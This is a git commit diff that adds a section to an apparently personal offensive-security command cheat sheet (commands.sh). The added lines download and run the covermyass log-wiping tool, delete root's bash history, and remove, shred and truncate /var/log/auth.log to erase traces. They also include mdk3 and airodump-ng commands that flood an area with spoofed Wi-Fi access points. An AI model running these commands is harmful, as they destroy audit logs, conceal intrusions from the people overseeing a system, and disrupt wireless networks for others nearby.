e417868c2756bafa3a744660e3624cf531ccd1ec
adel <86808805+elithaxxor@users.noreply.github.com>
2025-01-04 02:47:16 -0500

    Update commands.sh

--- commands.sh
+++ commands.sh
@@ -102,6 +102,33 @@ netsh int ipv4 set glob defaultcurhoplimit=65
 netsh int ipv6 set glob defaultcurhoplimit=65
 netsh int ipv6 set glob defaultcurhoplimit=128 # <-- RESET BACK TO DEFUALT 
 
+########## SHRED ALL DATA ################
+
+## NMAP SCRIPT LOCATION 
+ls -al /usr/share/nmap/scripts/ 
+
+## CANARY TOKENS
+canarytokens.com/generate 
+
+### LOGS ##### 
+kill -9 $$ ## exits the terminal without saving history 
+wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
+chmod +x covermyass
+./covermyass
+# BASH HISTORY 
+cd /dev/shm/
+rm /root/.bash_history 
+## or edit the var $HISTSIZE and $HISTFILESIZE 
+# AUTH-LOG FILES 
+cd /var/log
+sudo rm auth.log 
+shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
+truncate -s 0 /var/log/auth.log 
+
+## make abunch of differnt APS 
+ sudo mdk3 wlx0013eff5483f b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
+airodump-ng wlx0013eff5483f -c 11 ## use to monitor local APS 
+
 
 ------------------------------------- BLUETOOTHNESS ------------------------------------
  https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
